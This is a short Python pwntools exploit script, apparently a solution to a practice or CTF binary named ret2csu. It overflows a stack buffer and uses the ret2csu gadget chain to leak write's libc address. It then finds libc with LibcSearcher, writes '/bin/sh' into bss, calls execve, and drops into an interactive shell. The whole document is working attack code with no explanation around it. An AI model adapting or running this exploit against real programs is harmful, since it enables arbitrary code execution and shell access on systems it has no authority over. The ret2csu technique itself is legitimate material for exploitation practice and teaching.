from pwn import *
from LibcSearcher import LibcSearcher

ret2csu = ELF('./ret2csu')
sh = process('./ret2csu')

write_got = ret2csu.got['write']
read_got = ret2csu.got['read']
main_addr = ret2csu.symbols['main']
bss_base = ret2csu.bss()
csu_front_addr = 0x400600
csu_end_addr = 0x40061A

# First round - leak write address
sh.recvuntil(b'Hello, World\n')
sh.send(b'a' * 136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8) + p64(0x4005F0) + b'a' * 56 + p64(main_addr))
sleep(1)

# calculate libc_base and get the address of execve
write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')

# Second round - write /bin/sh to bss and call execve
sh.recvuntil('Hello, World\n')
sh.send(b'a' * 136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_base) + p64(16) + p64(0x4005F0) + b'a' * 56 + p64(main_addr))
sleep(1)

# Third round - call execve
sh.send(p64(execve_addr) + b'/bin/sh\x00')
sh.recvuntil('Hello, World\n')
sh.send(b'a' * 136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_base) + p64(bss_base+8) + p64(0) + p64(0) + p64(0x4005F0) + b'a' * 56 + p64(main_addr))

sh.interactive()